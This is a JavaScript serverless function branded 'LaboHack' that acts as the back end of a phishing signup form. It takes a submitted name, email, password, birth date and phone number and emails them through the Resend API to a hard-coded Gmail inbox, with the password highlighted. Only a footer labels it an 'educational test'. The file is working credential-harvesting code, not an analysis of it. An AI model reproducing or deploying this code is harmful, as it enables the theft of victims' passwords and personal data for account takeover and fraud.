const { Resend } = require('resend');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  const { nom, email, password, dateNaissance, telephone } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email et mot de passe requis' });
  }

  const resend = new Resend(process.env.RESEND_API_KEY);

  try {
    const { data, error } = await resend.emails.send({
      from: 'LaboHack <onboarding@resend.dev>',
      to: ['nyavosapp@gmail.com'],
      subject: '🔴 LaboHack - Nouvelle inscription',
      html: `
        <h2>📥 Données collectées</h2>
        <table border="1" cellpadding="8">
          <tr><td><strong>Nom</strong></td><td>${nom || 'Non renseigné'}</td></tr>
          <tr><td><strong>Email</strong></td><td>${email}</td></tr>
          <tr><td><strong>Mot de passe</strong></td><td style="color:red;font-weight:bold;">${password}</td></tr>
          <tr><td><strong>Date de naissance</strong></td><td>${dateNaissance || 'Non renseignée'}</td></tr>
          <tr><td><strong>Téléphone</strong></td><td>${telephone || 'Non renseigné'}</td></tr>
        </table>
        <p style="color:gray;font-size:12px;">⚠️ Test éducatif - LaboHack</p>
      `
    });

    if (error) throw error;
    res.status(200).json({ success: true });

  } catch (error) {
    console.error('Erreur Resend:', error);
    res.status(500).json({ error: 'Erreur lors de l\'envoi' });
  }
};
